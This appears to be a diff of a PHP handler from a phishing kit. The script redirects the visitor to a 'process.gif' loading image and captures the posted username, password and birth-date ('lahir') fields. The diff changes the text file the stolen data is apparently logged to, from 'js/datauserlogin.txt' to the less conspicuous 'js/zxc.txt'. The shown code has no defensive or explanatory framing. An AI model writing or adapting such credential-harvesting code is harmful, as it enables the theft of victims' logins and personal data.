@@ -1,6 +1,6 @@
 <?php
 header ("Location: proses/process.gif");
-$ADEx = "js/datauserlogin.txt";
+$ADEx = "js/zxc.txt";
 $ADEy = $_POST['username'];
 $ADEz = $_POST['password'];
 $ADE = $_POST['lahir'];
